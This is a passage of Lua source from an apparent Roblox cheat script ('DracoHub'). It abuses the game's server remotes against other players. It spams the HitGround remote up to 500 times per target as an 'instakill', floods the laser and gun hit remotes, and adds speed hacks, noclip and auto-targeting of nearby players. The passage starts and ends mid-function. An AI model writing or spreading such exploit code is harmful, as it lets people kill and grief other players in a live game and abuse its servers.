	sL2Tr = tr
	end
	end
	tbLockSpeed()
	task.delay(2.5, function()
	if sL2Done == true then
	return
	end
	if sL2Go ~= plr then
	return
	end
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.12)
	end)
	sL2Tr = nil
	end
	sL2Go = nil
	sL2T = nil
	sL2Wait = false
	sL2Cool = nil
	tbUnlockSpeed()
	end)
	if in6 then
	sL2Wait = true
	task.delay(1.50, function()
	if sL2Done == true then
	return
	end
	sL2Done = true
	if LocalPlayer:GetAttribute("YYDSStalkMode") ~= true then
	sTBBusy = false
	sL2Go = nil
	sL2T = nil
	sL2Wait = false
	local tb3 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	tb3 = tb3 and tb3:FindFirstChild("TerrorBlade")
	if tb3 then
	tb3.Text = "Terror Blade"
	end
	end
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.05)
	end)
	end
	local hum2 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an2 = hum2 and (hum2:FindFirstChildOfClass("Animator") or hum2)
	if an2 then
	local a2 = Instance.new("Animation")
	a2.AnimationId = "rbxassetid://18304298931"
	local ok2, tr2 = pcall(function()
	return an2:LoadAnimation(a2)
	end)
	if ok2 and tr2 then
	tr2.Priority = Enum.AnimationPriority.Action4
	tr2:Play()
	end
	end
	tbUnlockSpeed()
	do
	local stab2 = findGhostfaceStab2Remote()
	if stab2 then
	pcall(function()
	stab2:FireServer()
	end)
	end
	end
	end)
	end
	end)
	end
	if sL2Go == plr and sL2Wait ~= true and sL2T and sL2Done ~= true and (tick() - sL2T) >= 1.50 and (tick() - sL2T) <= 2.50 and in6 then
	sL2Done = true
	if LocalPlayer:GetAttribute("YYDSStalkMode") ~= true then
	sTBBusy = false
	sL2Go = nil
	sL2T = nil
	sL2Wait = false
	local tb3 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	tb3 = tb3 and tb3:FindFirstChild("TerrorBlade")
	if tb3 then
	tb3.Text = "Terror Blade"
	end
	end
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.05)
	end)
	end
	local humMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an = humMe and (humMe:FindFirstChildOfClass("Animator") or humMe)
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18304298931"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	end
	end
	tbUnlockSpeed()
	do
	local stab2 = findGhostfaceStab2Remote()
	if stab2 then
	pcall(function()
	stab2:FireServer()
	end)
	end
	end
	end
	end
	end
	end
	end
	if LocalPlayer:GetAttribute("YYDSStalkMode") ~= true and sTBBusy == true and sL2Wait ~= true and sL2T and sL2Done ~= true and (tick() - sL2T) >= 1.50 and (tick() - sL2T) <= 2.50 and meR then
	local best, bestD
	for _, p2 in ipairs(Players:GetPlayers()) do
	if p2 ~= LocalPlayer and p2.Character then
	local r2 = p2.Character:FindFirstChild("HumanoidRootPart")
	local h2 = p2.Character:FindFirstChildOfClass("Humanoid")
	if r2 and h2 and h2.Health > 0 then
	local d = (meR.Position - r2.Position).Magnitude
	if d <= 6 and (not bestD or d < bestD) then
	best = p2
	bestD = d
	end
	end
	end
	end
	if best then
	sL2Done = true
	sL2Wait = true
	sTBBusy = false
	sL2Go = nil
	sL2T = nil
	local tb3 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	tb3 = tb3 and tb3:FindFirstChild("TerrorBlade")
	if tb3 then
	tb3.Text = "Terror Blade"
	end
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.05)
	end)
	end
	local humMe = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	local an = humMe and (humMe:FindFirstChildOfClass("Animator") or humMe)
	if an then
	local a = Instance.new("Animation")
	a.AnimationId = "rbxassetid://18304298931"
	local ok, tr = pcall(function()
	return an:LoadAnimation(a)
	end)
	if ok and tr then
	tr.Priority = Enum.AnimationPriority.Action4
	tr:Play()
	end
	end
	tbUnlockSpeed()
	do
	local stab2 = findGhostfaceStab2Remote()
	if stab2 then
	pcall(function()
	stab2:FireServer()
	end)
	end
	end
	end
	end
	local pr = 0
	if sCharge <= 5 then
	pr = (sCharge / 5) * (120 / 360)
	elseif sCharge <= 11 then
	pr = (120 / 360) + ((sCharge - 5) / 6) * (120 / 360)
	else
	pr = (240 / 360) + ((sCharge - 11) / 5) * (120 / 360)
	end
	if pr > 1 then pr = 1 end
	if sRing then
	sRing.Visible = stalk:GetAttribute("AimOn") == true
	end
	if sSeg then
	local total = pr * 360
	if total > 360 then total = 360 end
	local caps = {120, 240, 360}
	local beat = 0
	if sCharge > 11 then
	beat = 0.5 + 0.5 * math.sin(tick() * 8.2)
	end
	for i = 1, 3 do
	local seg = sSeg[i]
	if seg then
	local ang = total
	if ang > caps[i] then
	ang = caps[i]
	end
	seg.rg.Rotation = math.clamp(ang, 0, 180)
	seg.lg.Rotation = math.clamp(ang, 180, 360)
	seg.rImg.Visible = (ang > 0)
	seg.lImg.Visible = (ang > 180)
	seg.rImg.ImageTransparency = 0
	seg.lImg.ImageTransparency = 0
	end
	end
	end
	if sNum then
	sNum.TextSize = 16
	local sc = sNum:FindFirstChild("Pulse")
	if sc then
	if sCharge > 11 then
	local ph = tick() % 0.72
	local amp = 0
	if ph < 0.11 then
	amp = math.sin((ph / 0.11) * math.pi)
	elseif ph < 0.22 then
	amp = 0.62 * math.sin(((ph - 0.11) / 0.11) * math.pi)
	end
	sc.Scale = 1 + 0.22 * amp
	else
	sc.Scale = 1
	end
	end
	end
	if sTint then
	local vis = 1
	if stalk:GetAttribute("Locked") == true then
	vis = 1 - (sCharge / 16)
	end
	sTint.BackgroundTransparency = 1
	for _, e in ipairs(sTint:GetChildren()) do
	if e:IsA("Frame") then
	e.BackgroundTransparency = vis
	end
	end
	end
	if sNum then
	local ntxt = "1"
	if sCharge >= 16 then
	ntxt = "3"
	elseif sCharge >= 11 then
	ntxt = "2"
	else
	ntxt = "1"
	end
	sNum.Text = ntxt
	sNum.Visible = (sCharge > 0.15)
	local stageCol = Color3.fromRGB(255, 170, 40)
	if ntxt == "2" then
	stageCol = Color3.fromRGB(196, 18, 38)
	elseif ntxt == "3" then
	stageCol = Color3.fromRGB(110, 8, 22)
	end
	sNum.TextColor3 = stageCol
	local t1 = sRing and sRing:FindFirstChild("Tick1")
	local t2 = sRing and sRing:FindFirstChild("Tick2")
	local t3 = sRing and sRing:FindFirstChild("Tick3")
	if t1 then t1.TextColor3 = (ntxt == "1") and stageCol or Color3.fromRGB(160, 160, 160) end
	if t2 then t2.TextColor3 = (ntxt == "2") and stageCol or Color3.fromRGB(160, 160, 160) end
	if t3 then t3.TextColor3 = (ntxt == "3") and stageCol or Color3.fromRGB(160, 160, 160) end
	end
	if sLine and sTarget and sTarget.Character then
	local r = sTarget.Character:FindFirstChild("HumanoidRootPart")
	if r then
	local hasMark = sMarks[sTarget] and sMarks[sTarget] > tick() and sLevel[sTarget] and sLevel[sTarget] >= 1
	sLine.Size = Vector3.new(0.3, 10, 0.3)
	sLine.Transparency = hasMark and 1 or 0
	sLine.Position = r.Position + Vector3.new(0, 3, 0)
	end
	end
	local folder = workspace:FindFirstChild("YYDSStalkMarks")
	if not folder then
	folder = Instance.new("Folder")
	folder.Name = "YYDSStalkMarks"
	folder.Parent = workspace
	end
	local live = {}
	for plr, untilT in pairs(sMarks) do
	local ch0 = plr and plr.Character
	local hum0 = ch0 and ch0:FindFirstChildOfClass("Humanoid")
	if (not plr) or (not plr.Parent) or (not ch0) or (not hum0) or hum0.Health <= 0 then
	sMarks[plr] = nil
	if sLevel then
	sLevel[plr] = nil
	end
	if sLockWho == plr then
	sLockWho = nil
	sTarget = nil
	sCharge = 0
	sNumBeat = false
	stalk:SetAttribute("Locked", false)
	end
	elseif untilT and untilT > tick() then
	live[tostring(plr.UserId)] = true
	local ch = plr.Character
	local r = ch and ch:FindFirstChild("HumanoidRootPart")
	local part = folder:FindFirstChild("M" .. tostring(plr.UserId))
	if r then
	if not part then
	part = Instance.new("Part")
	part.Name = "M" .. tostring(plr.UserId)
	part.Size = Vector3.new(0.2, 0.2, 0.2)
	part.Transparency = 1
	part.Anchored = true
	part.CanCollide = false
	part.CanTouch = false
	part.CastShadow = false
	part.Parent = folder
	local g = Instance.new("BillboardGui")
	g.Size = UDim2.new(0, 30, 0, 30)
	g.AlwaysOnTop = true
	g.Parent = part
	local n = Instance.new("TextLabel")
	n.Size = UDim2.new(1, 0, 1, 0)
	n.BackgroundTransparency = 1
	n.Font = Enum.Font.GothamBold
	n.TextSize = 22
	n.TextColor3 = Color3.fromRGB(255, 170, 40)
	n.Name = "N"
	n.Text = "1"
	n.Parent = g
	end
	local bb = part:FindFirstChildOfClass("BillboardGui")
	local lab = bb and bb:FindFirstChild("N")
	if lab then
	local lvN = (sLevel and sLevel[plr]) or 1
	lab.Text = tostring(lvN)
	if lvN >= 3 then
	lab.TextColor3 = Color3.fromRGB(110, 8, 22)
	elseif lvN >= 2 then
	lab.TextColor3 = Color3.fromRGB(196, 18, 38)
	else
	lab.TextColor3 = Color3.fromRGB(255, 170, 40)
	end
	end
	part.CFrame = CFrame.new(r.Position + Vector3.new(0, 4.6, 0))
	local fl = folder:FindFirstChild("F" .. tostring(plr.UserId))
	if not fl then
	fl = Instance.new("Part")
	fl.Name = "F" .. tostring(plr.UserId)
	fl.Shape = Enum.PartType.Cylinder
	fl.Size = Vector3.new(0.12, 50, 50)
	fl.Color = Color3.fromRGB(255, 170, 40)
	fl.Material = Enum.Material.SmoothPlastic
	fl.Transparency = 0.62
	fl.Anchored = true
	fl.CanCollide = false
	fl.CanTouch = false
	fl.CastShadow = false
	fl.Parent = folder
	end
	local hip = 3
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	if hum then
	hip = hum.HipHeight + 0.15
	end
	fl.Size = Vector3.new(0.12, 50, 50)
	fl.CFrame = CFrame.new(r.Position.X, r.Position.Y - hip + 0.45, r.Position.Z) * CFrame.Angles(0, 0, math.rad(90))
	local lvN = (sLevel and sLevel[plr]) or 1
	if lvN >= 3 then
	fl.Color = Color3.fromRGB(110, 8, 22)
	elseif lvN >= 2 then
	fl.Color = Color3.fromRGB(196, 18, 38)
	else
	fl.Color = Color3.fromRGB(255, 170, 40)
	end
	fl.Transparency = 0.62
	end
	else
	sMarks[plr] = nil
	end
	end
	for _, part in ipairs(folder:GetChildren()) do
	if not live[string.sub(part.Name, 2)] then
	part:Destroy()
	end
	end
	local mch = LocalPlayer.Character
	local mhum = mch and mch:FindFirstChildOfClass("Humanoid")
	local mroot = mch and mch:FindFirstChild("HumanoidRootPart")
	if mhum then
	local cur = mhum.WalkSpeed
	if cur ~= 5 and cur ~= 20 and cur ~= 10 and cur ~= 15 then
	sOldSpeed = cur
	end
	local want = sOldSpeed or 16
	if LocalPlayer:GetAttribute("YYDSNeckHold") == true then
	want = 15
	end
	local l2on = sL2T and sL2Done ~= true and (tick() - sL2T) <= 2.50
	if LocalPlayer:GetAttribute("YYDSNeckHold") ~= true and l2on then
	want = 10
	elseif stalk:GetAttribute("Locked") == true then
	want = 5
	elseif mroot then
	for plr, untilT in pairs(sMarks) do
	if untilT and untilT > tick() and plr and plr.Character then
	local prt = plr.Character:FindFirstChild("HumanoidRootPart")
	if prt and (prt.Position - mroot.Position).Magnitude <= 25 then
	want = 20
	break
	end
	end
	end
	end
	mhum.WalkSpeed = want
	if sL2Go then
	local chD = sL2Go.Character
	local hD = chD and chD:FindFirstChildOfClass("Humanoid")
	if (not chD) or (not hD) or hD.Health <= 0 then
	sL2Go = nil
	sL2T = nil
	sL2Done = false
	sL2Wait = false
	sL2Tr = nil
	sL2Cool = nil
	end
	end
	if sL2Cool and tick() >= sL2Cool and sL2Done ~= true then
	sL2Go = nil
	sL2T = nil
	sL2Wait = false
	sL2Cool = nil
	end
	if sL2T and sL2Done ~= true and (tick() - sL2T) > 2.50 then
	if sL2Tr then
	pcall(function()
	sL2Tr:Stop(0.12)
	end)
	sL2Tr = nil
	end
	sL2T = nil
	sL2Wait = false
	if LocalPlayer:GetAttribute("YYDSStalkMode") == true then
	sL2Cool = tick() + 3
	else
	sL2Go = nil
	sTBBusy = false
	end
	end
	end
	end)
	end)
	end
	task.wait(0.2)
	end
end)
local function enterAimMode()
	if aimModeActive then return end
	aimModeActive = true
	local col = aimColor
	local aimBtn = MoAimButton
	if kiraAim and KiraAimButton then aimBtn = KiraAimButton end
	do
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gun = fg and fg:FindFirstChild("DeadpoolSkill")
	if gun and gun.Visible then aimBtn = gun end
	end
	aimBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	if aimSource == "gun" then
	aimBtn.Text = "ON"
	cancelButton.Visible = false
	local fgS = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local sh = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if sh then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	sh.Size = UDim2.new(0, 44, 0, 44)
	sh.Position = UDim2.new(0.5, -88, 1, -96)
	local hv = sh:FindFirstChild("PcHint")
	if not hv then
	hv = Instance.new("TextLabel")
	hv.Name = "PcHint"
	hv.Size = UDim2.new(1, 0, 0, 12)
	hv.Position = UDim2.new(0, 0, 1, -6)
	hv.BackgroundTransparency = 1
	hv.Font = Enum.Font.GothamBold
	hv.TextSize = 11
	hv.TextColor3 = Color3.fromRGB(230, 230, 230)
	hv.Parent = sh
	end
	hv.Text = "C"
	hv.Visible = true
	else
	sh.Size = UDim2.new(0, 60, 0, 60)
	sh.Position = UDim2.new(aimBtn.Position.X.Scale, aimBtn.Position.X.Offset, aimBtn.Position.Y.Scale, aimBtn.Position.Y.Offset + 36)
	local hv = sh:FindFirstChild("PcHint")
	if hv then hv.Visible = false end
	end
	sh.ZIndex = 10
	sh.Visible = true
	end
	else
	aimBtn.Text = "Go"
	cancelButton.Parent = aimBtn
	cancelButton.Text = "Cancel"
	if LocalPlayer:GetAttribute("YYDSPC") == true and not kiraAim then
	cancelButton.Size = UDim2.new(0, 36, 0, 16)
	cancelButton.Position = UDim2.new(0.5, -18, 0, -20)
	else
	cancelButton.Size = UDim2.new(0, 40, 0, 26)
	cancelButton.Position = UDim2.new(0, -46, 0.5, -13)
	end
	cancelButton.Visible = true
	end
	local targetPlayer = getPlayerFromScreenCenter()
	if targetPlayer then
	aimTarget = targetPlayer
	aimActive = true
	local targetChar = targetPlayer.Character
	if targetChar then
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	if targetRoot then
	aimLine = Instance.new("Part")
	aimLine.Size = Vector3.new(0.3, 10, 0.3)
	aimLine.Color = col
	aimLine.Material = Enum.Material.Neon
	aimLine.Anchored = true
	aimLine.CanCollide = false
	aimLine.Parent = workspace
	aimLine.Position = targetRoot.Position + Vector3.new(0, 3, 0)
	aimHighlight = Instance.new("Highlight")
	aimHighlight.FillColor = col
	aimHighlight.FillTransparency = 0.7
	aimHighlight.OutlineColor = col
	aimHighlight.OutlineTransparency = 0
	aimHighlight.Parent = targetChar
	end
	end
	end
	if aimUpdateConnection then aimUpdateConnection:Disconnect() end
	aimUpdateConnection = RunService.Heartbeat:Connect(function()
	if not aimModeActive then return end
	local newTarget = getPlayerFromScreenCenter()
	if newTarget and newTarget ~= aimTarget then
	aimTarget = newTarget
	if aimHighlight then aimHighlight:Destroy() end
	if aimLine then aimLine:Destroy() end
	local newChar = newTarget.Character
	if newChar then
	local newRoot = newChar:FindFirstChild("HumanoidRootPart")
	if newRoot then
	aimLine = Instance.new("Part")
	aimLine.Size = Vector3.new(0.3, 10, 0.3)
	aimLine.Color = col
	aimLine.Material = Enum.Material.Neon
	aimLine.Anchored = true
	aimLine.CanCollide = false
	aimLine.Parent = workspace
	aimLine.Position = newRoot.Position + Vector3.new(0, 3, 0)
	aimHighlight = Instance.new("Highlight")
	aimHighlight.FillColor = col
	aimHighlight.FillTransparency = 0.7
	aimHighlight.OutlineColor = col
	aimHighlight.OutlineTransparency = 0
	aimHighlight.Parent = newChar
	end
	end
	end
	if aimLine and aimTarget then
	local targetChar = aimTarget.Character
	if targetChar then
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	if targetRoot then
	aimLine.Position = targetRoot.Position + Vector3.new(0, 3, 0)
	end
	end
	end
	end)
end
local function exitAimMode()
	if not aimModeActive then return end
	aimModeActive = false
	if aimSource == "gun" then
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gun = fg and fg:FindFirstChild("DeadpoolSkill")
	if gun then
	gun.Text = "Gun"
	gun.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	end
	local sh = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if sh then sh.Visible = false end
	elseif kiraAim and KiraAimButton then
	KiraAimButton.Text = "Death note"
	KiraAimButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
	else
	MoAimButton.Text = "Ramkill"
	MoAimButton.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
	end
	cancelButton.Text = "Cancel"
	cancelButton.Visible = false
	cancelButton.Parent = MoAimButton
	aimSource = nil
	if aimUpdateConnection then
	aimUpdateConnection:Disconnect()
	aimUpdateConnection = nil
	end
	if aimLine then aimLine:Destroy() aimLine = nil end
	if aimHighlight then aimHighlight:Destroy() aimHighlight = nil end
	aimTarget = nil
	aimActive = false
end
local function executeAimAction()
	if isExecuting then return end
	if not aimTarget then return end
	local targetChar = aimTarget.Character
	if not targetChar then return end
	local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
	if not targetRoot then return end
	local playerChar = LocalPlayer.Character
	if not playerChar then return end
	local humanoid = playerChar:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	local rootPart = playerChar:FindFirstChild("HumanoidRootPart")
	if not rootPart then return end
	if KickButton.Text == "ON" then
	KickButton.Text = "Speed Crash"
	KickButton.BackgroundColor3 = Color3.fromRGB(20, 90, 140)
	end
	if aimSource == "top" then
	KickButton:SetAttribute("RumLife", false)
	end
	local fastestManRemote = findTheFlashCwFastestManRemote()
	if fastestManRemote then
	fastestManRemote:FireServer()
	end
	local stab2Remote = findGhostfaceStab2Remote()
	local webBlossomRemote = findSpiderManWebBlossomRemote()
	local kickHitRemote = nil
	local cfKick = ReplicatedStorage:FindFirstChild("Characters")
	if cfKick then
	for _, folder in ipairs(cfKick:GetChildren()) do
	if folder.Name == "Springbonnie" then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	kickHitRemote = remotesFolder:FindFirstChild("KickHit")
	end
	break
	end
	end
	end
	isExecuting = true
	executionCanceled = false
	cancelButton.Text = "Stop"  -- Stop during load
	cancelButton.Visible = true
	local originalWalkSpeed = humanoid.WalkSpeed
	local originalJumpPower = humanoid.JumpPower
	local speed = 200
	local stopDist = 1.2
	humanoid.WalkSpeed = speed
	humanoid.JumpPower = 0
	local ramRunB = nil
	do
	local animator = humanoid:FindFirstChildOfClass("Animator")
	if animator then
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://11759352907"
	ramRunB = animator:LoadAnimation(anim)
	ramRunB.Priority = Enum.AnimationPriority.Action4
	ramRunB.Looped = true
	ramRunB:Play(0, 1, 1)
	ramRunB:AdjustSpeed(1)
	end
	end
	local stab2Triggered = false
	if executionFlashThread then task.cancel(executionFlashThread) end
	executionFlashThread = task.spawn(function()
	local chars = {"● ● ●", "● ● ○", "● ○ ●", "○ ● ●"}
	local index = 1
	while isExecuting do
	MoAimButton.Text = chars[index]
	index = index % #chars + 1
	task.wait(0.25)
	end
	MoAimButton.Text = "Go"
	end)
	if webBlossomRemote then
	if webBlossomThread then task.cancel(webBlossomThread) end
	webBlossomThread = task.spawn(function()
	while isExecuting do
	webBlossomRemote:FireServer()
	task.wait(0.1)
	end
	end)
	end
	local collideSave = {}
	local function setNoclip(on)
	if not playerChar then return end
	for _, part in ipairs(playerChar:GetDescendants()) do
	if part:IsA("BasePart") then
	if on then
	if collideSave[part] == nil then
	collideSave[part] = part.CanCollide
	end
	part.CanCollide = false
	else
	if collideSave[part] ~= nil then
	part.CanCollide = collideSave[part]
	end
	end
	end
	end
	end
	setNoclip(true)
	if executionConnection then executionConnection:Disconnect() end
	executionConnection = RunService.Heartbeat:Connect(function()
	if executionCanceled or not isExecuting then
	if rootPart then
	rootPart.Velocity = Vector3.zero
	end
	return
	end
	if not targetRoot or not targetRoot.Parent then
	executionCanceled = true
	return
	end
	setNoclip(true)
	local offset = targetRoot.Position - rootPart.Position
	local distance = offset.Magnitude
	if distance < 0.001 then
	return
	end
	local direction = offset.Unit
	rootPart.CFrame = CFrame.lookAt(rootPart.Position, targetRoot.Position)
	rootPart.Velocity = direction * speed
	if not stab2Triggered then
	if distance <= 4 then
	stab2Triggered = true
	local marked = aimTarget
	task.spawn(function()
	local remote = ReplicatedStorage:FindFirstChild("Characters")
	remote = remote and remote:FindFirstChild("Homelander")
	remote = remote and remote:FindFirstChild("Remotes")
	remote = remote and remote:FindFirstChild("HitGround")
	if not remote or not marked then
	return
	end
	local ch0 = marked.Character
	if ch0 then
	task.spawn(function()
	for _ = 1, 500 do
	pcall(function()
	remote:FireServer(marked.DisplayName)
	remote:FireServer(marked.Name)
	remote:FireServer(ch0)
	end)
	end
	end)
	end
	local endTime = tick() + 1.5
	while tick() < endTime do
	local ch = marked.Character
	if not ch then
	break
	end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	if (not hum) or hum.Health <= 0 then
	break
	end
	pcall(function()
	remote:FireServer(marked.DisplayName)
	remote:FireServer(marked.Name)
	remote:FireServer(ch)
	end)
	task.wait(0.05)
	end
	end)
	end
	end
	if distance < stopDist then
	executionCanceled = true
	end
	end)
	while isExecuting and not executionCanceled do
	task.wait(0.05)
	end
	if executionConnection then
	executionConnection:Disconnect()
	executionConnection = nil
	end
	if webBlossomThread then
	task.cancel(webBlossomThread)
	webBlossomThread = nil
	end
	if rootPart then
	rootPart.Velocity = Vector3.zero
	end
	setNoclip(false)
	if ramRunB then
	ramRunB:Stop()
	ramRunB = nil
	end
	if humanoid then
	humanoid.WalkSpeed = originalWalkSpeed
	humanoid.JumpPower = originalJumpPower
	humanoid:MoveTo(rootPart.Position)
	end
	if executionFlashThread then
	task.cancel(executionFlashThread)
	executionFlashThread = nil
	end
	MoAimButton.Text = "Go"
	cancelButton.Text = "Cancel"
	isExecuting = false
	exitAimMode()
end
MoAimButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if isExecuting then return end
	if aimModeActive then
	if kiraAim then
	exitAimMode()
	else
	task.spawn(executeAimAction)
	end
	else
	aimSource = "top"
	aimColor = Color3.fromRGB(255, 0, 0)
	enterAimMode()
	end
end)
cancelButton.MouseButton1Click:Connect(function()
	if isExecuting then
	executionCanceled = true
	return
	end
	exitAimMode()
end)
-- ==================== Laser (12s cooldown + 1.5s zone damage) ====================
local laserActive = false
local laserThread = nil
LaserButton.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if LaserButton:GetAttribute("CD") == true then return end
	local remote = findHomelanderMoveOneRemote()
	if not remote then
	LaserButton.Text = "No Remote"
	LaserButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.delay(0.5, function()
	if LaserButton:GetAttribute("CD") ~= true then
	LaserButton.Text = "Laser"
	LaserButton.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	end
	end)
	return
	end
	if simultaneousEnabled then
	for i = 1, simultaneousCount do
	remote:FireServer()
	end
	else
	remote:FireServer()
	end
	LaserButton:SetAttribute("CD", true)
	local cdToken = tick()
	LaserButton:SetAttribute("CDToken", cdToken)
	LaserButton.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
	LaserButton.BackgroundTransparency = 0.5
	LaserButton.Text = "12"
	task.spawn(function()
	for i = 12, 1, -1 do
	task.wait(1)
	if LaserButton:GetAttribute("CDToken") ~= cdToken then break end
	if i > 1 then
	LaserButton.Text = tostring(i - 1)
	end
	end
	if LaserButton:GetAttribute("CDToken") == cdToken then
	LaserButton:SetAttribute("CD", false)
	LaserButton.Text = "Laser"
	LaserButton.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	LaserButton.BackgroundTransparency = 0
	end
	end)
	-- 1.5s laser damage zone (Length40 Width1 Height4), Kira instakill = HitGround
	task.spawn(function()
	local hitIds = {}
	local endT = tick() + 1.5
	local hitG = nil
	pcall(function()
	hitG = ReplicatedStorage.Characters.Homelander.Remotes.HitGround
	end)
	if not hitG then
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	for _, f in ipairs(chars:GetChildren()) do
	if string.lower(f.Name) == "homelander" then
	local kr = f:FindFirstChild("Remotes")
	hitG = kr and kr:FindFirstChild("HitGround")
	break
	end
	end
	end
	end
	while tick() < endT do
	local char = LocalPlayer.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if hrp and hitG then
	local origin = hrp.Position
	local direction = hrp.CFrame.LookVector
	local centerPos = origin + direction * 20
	local boxCF = CFrame.lookAt(centerPos, centerPos + direction)
	local boxSize = Vector3.new(1, 4, 40)
	local op = OverlapParams.new()
	op.FilterType = Enum.RaycastFilterType.Include
	local list = {}
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	table.insert(list, plr.Character)
	end
	end
	op.FilterDescendantsInstances = list
	local parts = workspace:GetPartBoundsInBox(boxCF, boxSize, op)
	local seen = {}
	for _, part in ipairs(parts) do
	local model = part:FindFirstAncestorOfClass("Model")
	if model then
	local plr = Players:GetPlayerFromCharacter(model)
	if plr then seen[plr] = true end
	end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local root = plr.Character:FindFirstChild("HumanoidRootPart") or plr.Character:FindFirstChild("Head")
	if root then
	local lp = boxCF:PointToObjectSpace(root.Position)
	if math.abs(lp.X) <= 0.5 and math.abs(lp.Y) <= 2 and math.abs(lp.Z) <= 20 then
	seen[plr] = true
	end
	end
	end
	end
	for plr in pairs(seen) do
	if plr and (not hitIds[plr.UserId]) then
	hitIds[plr.UserId] = true
	local marked = plr
	task.spawn(function()
	local laserRem = nil
	local chars2 = ReplicatedStorage:FindFirstChild("Characters")
	if chars2 then
	for _, f2 in ipairs(chars2:GetChildren()) do
	if string.lower(f2.Name) == "homelander" then
	local kr2 = f2:FindFirstChild("Remotes")
	laserRem = kr2 and kr2:FindFirstChild("LaserEyesHit")
	break
	end
	end
	end
	for _ = 1, 7 do
	pcall(function()
	laserRem:FireServer(marked.DisplayName)
	laserRem:FireServer(marked.Name)
	laserRem:FireServer(marked.Character)
	end)
	end
	local ch0 = marked.Character
	if ch0 and hitG then
	task.spawn(function()
	for _ = 1, 500 do
	hitG:FireServer(marked.DisplayName)
	hitG:FireServer(marked.Name)
	hitG:FireServer(ch0)
	end
	end)
	end
	local endTime = tick() + 1.5
	while tick() < endTime do
	local ch = marked.Character
	if not ch then
	break
	end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	if (not hum) or hum.Health <= 0 then
	break
	end
	hitG:FireServer(marked.DisplayName)
	hitG:FireServer(marked.Name)
	hitG:FireServer(ch)
	task.wait(0.05)
	end
	end)
	end
	end
	end
	task.wait(0.05)
	end
	end)
end)
do
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gun = fg and fg:FindFirstChild("DeadpoolSkill")
	if gun then
	gun.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if aimModeActive then
	exitAimMode()
	local sl = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local sh = sl and sl:FindFirstChild("DeadpoolShoot")
	if sh then sh.Visible = false end
	else
	aimSource = "gun"
	aimColor = Color3.fromRGB(200, 30, 30)
	enterAimMode()
	end
	end)
	end
	local shoot = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer") and LocalPlayer.PlayerGui.DracoHubShootLayer:FindFirstChild("DeadpoolShoot")
	if shoot then
	local gunTrack = nil
	local gunRun = 0
	local gunLast = 0
	shoot.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if not aimModeActive then return end
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local vig = chars and chars:FindFirstChild("Vigilante")
	local vigR = vig and vig:FindFirstChild("Remotes")
	local t = aimTarget
	if not t then
	t = getPlayerFromScreenCenter()
	end
	local high = false
	local fg2 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local gunBtn = fg2 and fg2:FindFirstChild("DeadpoolSkill")
	if gunBtn and gunBtn:GetAttribute("GunHigh") == true then
	high = true
	end
	if high then
	if t then
	local wal = chars and chars:FindFirstChild("Walter")
	local walR = wal and wal:FindFirstChild("Remotes")
	local counter = walR and walR:FindFirstChild("GunCounter")
	local mf = chars and chars:FindFirstChild("MrFantastic")
	local mfR = mf and mf:FindFirstChild("Remotes")
	local sin = mfR and mfR:FindFirstChild("HitSpin")
	local hitG = chars and chars:FindFirstChild("Homelander")
	hitG = hitG and hitG:FindFirstChild("Remotes")
	hitG = hitG and hitG:FindFirstChild("HitGround")
	if counter then
	counter:FireServer(t.DisplayName)
	counter:FireServer(t.Name)
	counter:FireServer(t.Character)
	end
